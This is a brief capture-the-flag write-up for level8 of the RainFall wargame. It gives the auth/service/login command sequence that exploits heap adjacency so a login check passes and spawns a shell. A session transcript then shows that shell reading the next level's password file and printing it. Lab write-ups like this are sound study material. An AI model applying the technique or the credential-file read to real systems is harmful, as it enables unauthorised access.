## Exploit

No payload needed. Just issue the right sequence of commands:

```bash
./level8
```

```
(nil), (nil)
auth                          ← allocates auth buffer at 0x804a008
0x804a008, (nil)
service aaaa...               ← strdup allocates at 0x804a018
0x804a008, 0x804a018
login                         ← checks auth+0x20 = 0x804a028 → still NULL, denied
service aaaa...               ← strdup allocates at 0x804a028 → auth+0x20 now non-null!
0x804a008, 0x804a028
login                         ← check passes → shell spawned
$
```

> A single long `service` string also works: the data written by `strdup` overflows into `auth+0x20` directly, as seen in the first GDB session.

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

